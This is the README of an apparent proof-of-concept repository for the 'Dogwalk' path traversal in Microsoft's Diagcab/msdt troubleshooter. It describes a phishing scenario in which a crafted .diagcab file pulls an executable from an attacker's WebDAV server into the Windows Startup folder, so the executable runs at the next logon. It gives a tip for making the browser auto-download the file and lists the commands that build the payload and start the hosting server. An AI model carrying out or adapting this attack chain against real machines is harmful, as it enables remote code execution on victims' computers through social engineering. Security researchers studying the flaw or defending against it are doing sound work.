<div align=center>
<h1> Dogwalk Proof-of-Concept🐾</h1>
<pre><code>
<h><strong>🚨 Disclaimer 🚨</strong></h4>

<br><br>The PoC enables an attacker to be able to obtain <strong>Remote Code Injection</strong> on a Windows victim device.
<br>The goal of this repo is to make a PoC even more usable than the <a href=https://github.com/irsl/microsoft-diagcab-rce-poc>initial repo</a>.
<br>DO NOT USE IT WITHOUT PRIOR AUTHORIZATION!
<br><br><i>Regarding the damage caused and the simplicity of exploitation, I hope Microsoft will fix it</i>
</code></pre>
</div>

* [🧠 Understand it](#how-it-works)
* [🐾 Run it](#lets-get-it)
* [📺 Show Me](##-wait-and-see)

***Core concept:*** path traversal vulnerability in Microsoft's Diagcab technology (`msdt`) that could lead to remote code execution.<br>
You can find the full advisory in the [blog post](https://medium.com/@radimre83/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd)<br>
The vulnerability has been reported for **2 years** (by [@irsl](https://github.com/irsl)) and still has **no fix**!




## How it works?

The Proof-of-Concept sets up a webdav server hosting a malicious `.diagcab` file that will perform a path transversal to write a malicious executable in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`. Writing an executable in this folder will execute it each time the user start the windows machine, this is called ***Boot Logon Autostart Execution***.

So, basically what we need is:
* webDAV server
* Malicious `.diagcab` file
* Malicious executable *(legit one or basic text file is sufficient for the PoC)*

### 🎬 Scenario

1. The victim will visit a link (phishing, social engineering, or whatever) that will download the `.diagcab` file

*(💡 use `Content-type: application/octet-stream`response header to make the Browser automaticaly downloading the file when browsing the url)*

2. The victim click on the file download (could easily/accidentaly happen by just clicking on the browser download folder)
3. The cab file loads the webdav malicious executable -> ***(path transversal)*** downloaded in Start up menu
4. The user restart his device -> ***(RCE)***

## Let's get it

### 🔨 Craft the  `.diagcab` file

* `.diagcfg` are simple XML files that hold reference to one or more diagnostic packages and provide meta information about them
* They are packaged into Microsoft cabinet file archives and saved with `.diagcab` extension.

Firt build `custom.diagcfg`:
```shell
./build-malicious-diagcfg.sh --url [WEBDAV_URL]
```

And build the `hotfix895214.diagcab`:
```shell
cabarc.exe n hotfix895214.diagcab custom.diagcfg
# run it on windows (or with wine). If you do not find carbarc.exe use http://jc.bellamy.free.fr/download/cabarc.exe or http://download.microsoft.com/download/platformsdk/cab/2.0/w98nt42kmexp/en-us/Cabsdk.exe
```

### 🏗️ Set up the server

Put the executable you want to transfer on victim machine within `./webdav/malicious` folder... *(Here we use the classic `calc.exe`)*

...And launch the server:
```
perl diagcab-webdav-poc.pl
```

### 👁️ Wait and see...
